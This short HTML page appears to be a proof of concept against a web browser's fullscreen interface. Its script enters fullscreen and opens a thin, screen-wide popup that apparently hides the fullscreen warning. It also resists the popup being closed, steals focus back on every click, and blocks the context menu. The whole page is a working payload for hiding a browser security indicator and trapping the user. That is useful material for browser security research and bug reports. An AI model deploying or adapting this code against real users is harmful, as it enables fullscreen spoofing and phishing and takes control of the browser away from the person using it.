<!DOCTYPE html>
<head>
    <title>Cover Full-Screen UI</title>
</head>
<body>
    <button>Click Me</button>
<script>
let popupWindow;

function makePopUp() {
  popupWindow = window.open('about:blank', '', `top=0,height=1,width=${window.screen.width}`);
  popupWindow.addEventListener('beforeunload', event => event.preventDefault());
}

function focusPopUp() {
  if (!popupWindow) {
    return;
  }
  popupWindow.focus();
}

function combination() {
  document.body.requestFullscreen();
  makePopUp();
  focusPopUp();
}

// When user tries to focus main window, keep popup in focus.z
document.body.addEventListener('click', focusPopUp);
document.body.addEventListener('mousedown', focusPopUp);
document.body.addEventListener('contextmenu', (event) => {
  event.preventDefault();
  focusPopUp();
});

document.querySelector('button').addEventListener('click', combination);
</script>
</body>
